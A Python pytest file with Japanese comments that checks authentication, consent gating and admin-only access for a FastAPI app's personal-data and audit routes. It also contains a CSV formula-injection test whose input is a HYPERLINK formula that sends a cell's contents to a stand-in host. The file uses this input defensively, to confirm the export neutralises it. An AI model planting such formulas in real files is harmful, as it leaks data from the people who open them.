"""`/api/me/*` と `/api/admin/*` の **HTTP レベル**の強制（authorization）を検証する。

なぜこのファイルが要るか
----------------------
`require_consent` / `require_admin` の実装は正しい。しかし
**それを観測する HTTP レベルのテストがリポジトリに 1 件もなかった**。
`tests/test_me_api.py` はリポジトリ層と `_to_csv` を直接叩くだけで、
`/api/me/export` や `/api/admin/audit` が「資格情報なしで 401/403 になる」
ことを**一度も検証していない**。

つまり、依存関数を取り付け忘れた・`Depends` を外した・
`require_tenant` を `optional_principal` に差し替えたような
**回帰を検出する手段が存在しなかった**。個人データ（開示・削除）と
監査ログを扱う経路なので、これは**最大のカバレッジ穴**。

このファイルは「無認証」「一般利用者」の 2 立場を HTTP 上で作り分け、
**どの組み合わせで 200 が返ってよいか**を固定する。
"""

from __future__ import annotations

import pytest

from fastapi.testclient import TestClient  # noqa: E402

import retro_radio.server as server_module  # noqa: E402
from retro_radio.api.deps import settings_dependency  # noqa: E402
from retro_radio.config import Settings  # noqa: E402

#: 32 文字以上（`MIN_SECRET_KEY_LENGTH` を満たす）。
TEST_SECRET = "me-http-test-secret-key-0123456789abcd"
TEST_MEMBER_KEY = "me-http-test-member-key-0123456789"

AUTH_SETTINGS = Settings(
    require_auth=True,
    secret_key=TEST_SECRET,
    single_user_key=TEST_MEMBER_KEY,
    require_consent=True,
    admin_emails=["admin@example.com"],
)


@pytest.fixture(autouse=True)
def _require_auth_env(monkeypatch):
    """全テストを「認証必須・同意必須」で動かす。

    `server._auth_enforced()` は環境変数を優先して読むため、
    import 時ではなく **autouse fixture** で決める
    （import 時に書くと他モジュールと実行順で競合する）。
    """
    monkeypatch.setenv("RETRO_RADIO_REQUIRE_AUTH", "1")


@pytest.fixture
def auth_env(monkeypatch):
    monkeypatch.setenv("RETRO_RADIO_REQUIRE_AUTH", "1")
    server_module.app.dependency_overrides[settings_dependency] = lambda: AUTH_SETTINGS
    try:
        yield AUTH_SETTINGS
    finally:
        server_module.app.dependency_overrides.pop(settings_dependency, None)


@pytest.fixture
def client(auth_env):
    """認証必須・同意必須・外部依存遮断の TestClient。"""
    with TestClient(server_module.app) as test_client:
        yield test_client


#: 同意が必要な（= 個人データに触れる）ルート。
CONSENT_GATED = [
    ("GET", "/api/me/export"),
    ("DELETE", "/api/me"),
    ("GET", "/api/me/music-profile"),
    ("POST", "/api/me/music-profile/tracks"),
    ("DELETE", "/api/me/music-profile/tracks"),
]

#: 認証だけで通る（同意不要）ルート。
AUTH_ONLY = [
    ("GET", "/api/me"),
    ("GET", "/api/me/consent"),
]

#: 管理者限定ルート。
ADMIN_ROUTES = [
    ("GET", "/api/admin/audit"),
    ("GET", "/api/admin/audit/stats"),
    ("POST", "/api/admin/audit"),
]


def _login(client, key):
    """ベアラートークンでセッションを発行する（Cookie が焼かれる）。"""
    response = client.post("/api/auth/session", headers={"Authorization": f"Bearer {key}"})
    assert response.status_code == 200, response.text
    return client


class TestUnauthenticatedIsRejected:
    """**資格情報なし**では、個人データにも監査にも到達できないこと。

    ここが抜けると、`GET /api/me/export` が匿名で誰でも
    （`default` テナント共有の）開示データを返してしまう。
    """

    @pytest.mark.parametrize("method,path", CONSENT_GATED + AUTH_ONLY)
    def test_me_routes_reject_anonymous(self, client, method, path):
        response = client.request(method, path)
        assert response.status_code in (401, 403), (
            f"{method} {path} が認証なしで {response.status_code} を返した: "
            f"{response.text[:200]}"
        )

    @pytest.mark.parametrize("method,path", ADMIN_ROUTES)
    def test_admin_routes_reject_anonymous(self, client, method, path):
        response = client.request(method, path, json={} if method == "POST" else None)
        assert response.status_code in (401, 403), (
            f"{method} {path} が認証なしで {response.status_code} を返した"
        )

    def test_consent_post_is_rejected_anonymous(self, client):
        response = client.post("/api/me/consent", json={"accepted": True})
        assert response.status_code in (401, 403), response.text


class TestMemberCannotReachAdmin:
    """**一般利用者**は管理者の監査ログに到達できないこと。"""

    @pytest.mark.parametrize("method,path", ADMIN_ROUTES)
    def test_admin_audit_rejects_a_member(self, client, method, path):
        logged = _login(client, TEST_MEMBER_KEY)
        response = logged.request(method, path, json={} if method == "POST" else None)
        assert response.status_code == 403, (
            f"一般利用者が {method} {path} に {response.status_code} で到達できた: "
            f"{response.text[:200]}"
        )


class TestMemberGetsWithoutConsent:
    """同意が**未記録**なら、個人データに触れる操作は 403 になること。

    `require_consent` が効いていないと、`GET /api/me/export` /
    `DELETE /api/me` が同意なしに通ってしまう。これは開示の法的根拠を
    壊すので、**最も厳密に**固定する。
    """

    @pytest.mark.parametrize("method,path", CONSENT_GATED)
    def test_consent_gated_routes_reject_a_member_without_consent(self, client, method, path):
        logged = _login(client, TEST_MEMBER_KEY)
        response = logged.request(method, path)
        assert response.status_code == 403, (
            f"同意未記録の一般利用者が {method} {path} に "
            f"{response.status_code} で到達できた: {response.text[:200]}"
        )

    @pytest.mark.parametrize("method,path", AUTH_ONLY)
    def test_auth_only_routes_work_without_consent(self, client, method, path):
        """同意が無くても `GET /api/me` / `GET /api/me/consent` は 200。

        同意の**確認自体**に同意を要求すると詰むため、ここは通さなければならない。
        """
        logged = _login(client, TEST_MEMBER_KEY)
        response = logged.request(method, path)
        assert response.status_code == 200, (
            f"{method} {path} が同意確認自体に 200 を返さない: {response.text[:200]}"
        )


class TestConsentIsRequiredThenSatisfied:
    """同意を記録した後は、同意が必要な操作が通ること。

    「常に 403」の実装に退行していないことも併せて固定する
    （ガードだけ足して機能していない変化を検出するため）。
    """

    def test_member_can_record_consent_and_then_reach_export(self, client):
        logged = _login(client, TEST_MEMBER_KEY)

        before = logged.get("/api/me/consent")
        assert before.status_code == 200, before.text

        granted = logged.post("/api/me/consent", json={"accepted": True})
        assert granted.status_code == 200, granted.text

        after = logged.get("/api/me/consent")
        assert after.status_code == 200, after.text
        assert after.json().get("consented") is True, after.json()

        export = logged.get("/api/me/export")
        assert export.status_code == 200, export.text

    def test_withdrawing_consent_re_blocks_the_export(self, client):
        """同意を**撤回**すると、再び開示できなくなること。"""
        logged = _login(client, TEST_MEMBER_KEY)
        assert logged.post("/api/me/consent", json={"accepted": True}).status_code == 200
        assert logged.get("/api/me/export").status_code == 200

        withdrawn = logged.post("/api/me/consent/withdraw")
        assert withdrawn.status_code == 200, withdrawn.text

        again = logged.get("/api/me/export")
        assert again.status_code == 403, (
            f"同意撤回後も開示できた（{again.status_code}）: {again.text[:200]}"
        )


class TestDisclosureCsvIsFormulaSafe:
    """開示 CSV が**数式として実行されない**こと。

    利用者が自分で登録した曲名（最大 500 文字・内容検証なし）に
    `=HYPERLINK("https://x/?d="&A1,"x")` を書ける。`csv.QUOTE_ALL` は
    引用符で包むだけで**数式の実行を抑止しない**ため、Excel で開いた瞬間に
    **同じファイル内の他の列が漏れる**。開示 CSV はそのまま
    施設管理者や開示請求担当者に渡すものなので、この経路は現実に近い。
    """

    def test_formula_like_cell_is_neutralised(self, client):
        logged = _login(client, TEST_MEMBER_KEY)
        assert logged.post("/api/me/consent", json={"accepted": True}).status_code == 200

        recorded = logged.post(
            "/api/me/music-profile/tracks",
            json={"title": '=HYPERLINK("https://x/?d="&A1,"pwn")', "artist": "@SUM(A1)"},
        )
        assert recorded.status_code in (200, 201), recorded.text

        response = logged.get("/api/me/export?format=csv")
        assert response.status_code == 200, response.text
        body = response.text

        # `'=HYPERLINK` の中に `=HYPERLINK` が**部分文字列として**含まれるため、
        # 「含まれていないこと」では判定できない。
        # **セルの先頭**が数式文字でないことを確認する（`QUOTE_ALL` なので
        # セルは必ず `"` で始まる）。
        assert '"=HYPERLINK' not in body, "数式がセルの先頭に残っている（無害化されていない）"
        assert '"@SUM' not in body, "数式がセルの先頭に残っている（無害化されていない）"
        assert "'=HYPERLINK" in body, "先頭に ' が前置されていない"
        assert "'@SUM" in body, "先頭に ' が前置されていない"

    def test_japanese_title_is_not_mangled(self, client):
        """数式でない値には**何も付けない**こと（過剰な加工をしない）。"""
        logged = _login(client, TEST_MEMBER_KEY)
        assert logged.post("/api/me/consent", json={"accepted": True}).status_code == 200

        logged.post(
            "/api/me/music-profile/tracks",
            json={"title": "上を向いて歩こう", "artist": "三口昌美"},
        )
        body = logged.get("/api/me/export?format=csv").text
        assert "上を向いて歩こう" in body, body[:400]


class TestAdminRoutesKeepTheAdminDependency:
    """`/api/admin/*` が**宣言通り** `require_admin` に依存していることを固定する。

    「一般利用者は 403」（`TestMemberCannotReachAdmin`）だけでも
    `require_tenant` だけの取り違えは検出できない。依存関数を
    `optional_principal` や `require_tenant` に差し替えられた場合、
    一般利用者も 403 のままなので**検証テストは緑のまま通ってしまう**。
    そこで**依存関数の実体**を直接確認する。

    .. note::
       `include_router` は FastAPI 0.11 以降、path を持たない
       `_IncludedRouter` 1 件だけを `app.routes` に登録する
       （このリポジトリでも `me` / `audit` がそうなる）。
       実際のルートは `original_router.routes` にあるため、
       それを辿らないと `/api/admin/*` に辿り着けない。
       同じ理由で `tests/test_api_access_control.py::test_v1_router_is_not_mounted`
       （`"/api/v1" not in paths`）は**常に空振り**している。
    """

    ADMIN_PATHS = ("/api/admin/audit", "/api/admin/audit/stats")

    @staticmethod
    def _flatten_routes(routes):
        """`_IncludedRouter` を展開して `APIRoute` を返す。"""
        from fastapi.routing import APIRoute

        for route in routes:
            if isinstance(route, APIRoute):
                yield route
                continue
            original = getattr(route, "original_router", None)
            if original is not None:
                yield from TestAdminRoutesKeepTheAdminDependency._flatten_routes(
                    original.routes
                )
            nested = getattr(route, "routes", None)
            if nested:
                yield from TestAdminRoutesKeepTheAdminDependency._flatten_routes(nested)

    def test_admin_audit_routes_are_registered(self):
        found = {r.path for r in self._flatten_routes(server_module.app.routes)}
        for path in self.ADMIN_PATHS:
            assert path in found, f"{path} が登録されていない（ルートが外された）"

    def test_admin_audit_routes_depend_on_require_admin(self):
        """`/api/admin/audit*` の依存に `require_admin` が含まれること。"""
        by_path = {r.path: r for r in self._flatten_routes(server_module.app.routes)}

        for path in self.ADMIN_PATHS:
            route = by_path[path]
            names = {c.call.__name__ for c in route.dependant.dependencies}
            assert "require_admin" in names, (
                f"{path} の依存が {sorted(names)}。require_admin が外されている"
            )
